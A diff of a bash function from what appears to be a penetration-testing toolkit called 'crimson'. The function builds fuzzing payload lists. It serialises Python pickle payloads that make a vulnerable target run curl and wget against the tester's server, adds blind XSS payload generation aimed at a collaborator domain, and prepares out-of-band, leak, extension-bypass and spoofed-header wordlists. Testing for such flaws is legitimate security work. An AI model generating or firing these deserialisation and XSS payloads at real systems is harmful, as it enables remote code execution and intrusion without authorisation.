@@ -61,8 +61,15 @@ function words {
       python3 $HOME/tools/crimson/scripts/pickle_ser.py "curl $2/curl_pickle_ser" >> oob.fuzz
       python3 $HOME/tools/crimson/scripts/pickle_ser.py "wget $2/wget_pickle_ser" >> oob.fuzz
     else
-      python3 $HOME/tools/crimson/scripts/pickle_ser.py "curl $2:$3/curl_pickle_ser" >> oob.fuzz
-      python3 $HOME/tools/crimson/scripts/pickle_ser.py "wget $2:$3/wget_pickle_ser" >> oob.fuzz
+        python3 $HOME/tools/crimson/scripts/pickle_ser.py "curl $2:$3/curl_pickle_ser" >> oob.fuzz
+        python3 $HOME/tools/crimson/scripts/pickle_ser.py "wget $2:$3/wget_pickle_ser" >> oob.fuzz
+    fi
+      # BLIND XSS PAYLOADS
+    python3 "$HOME/tools/crimson/scripts/blind_xss_gen.py" "$HOME/tools/crimson/words/exp/BLIND_XSS" "$1" >> oob.fuzz
+    if [[ -z "$3" ]]; then
+        python3 "$HOME/tools/crimson/scripts/blind_xss_gen.py" "$HOME/tools/crimson/words/exp/BLIND_XSS" "$2" >> oob.fuzz
+    else
+        python3 "$HOME/tools/crimson/scripts/blind_xss_gen.py" "$HOME/tools/crimson/words/exp/BLIND_XSS" "$2:$3" >> oob.fuzz
     fi
     # Preparing OOB payloadlist and copying it to the clipboard
     cat "$HOME"/tools/crimson/words/exp/OOB | sed "s/domain_collab/$1/g" |sed "s/vps_ip/$2/g" >> oob.fuzz1
@@ -73,8 +80,7 @@ function words {
     cat "$HOME"/tools/crimson/words/bug >> bug.fuzz
     cat "$HOME"/tools/crimson/words/exp/http_leaks | sed "s/domain_collab/$1/g" >> http_leaks
     cat "$HOME"/tools/crimson/words/exp/bypass_ext >> bypass_ext
-    cat "$HOME"/tools/crimson/words/exp/BLIND_XSS | sed "s/domain_collab/$1/g" >> BLIND_XSS
-    cat "$HOME"/tools/crimson/words/exp/headers | sed "s/domain_collab/$1/g" >> headers.fuzz
+    cat "$HOME"/tools/crimson/words/exp/spoofing_headers.txt > spoofing_headers.txt
     # Preparing upload
     mkdir upload
     cd upload
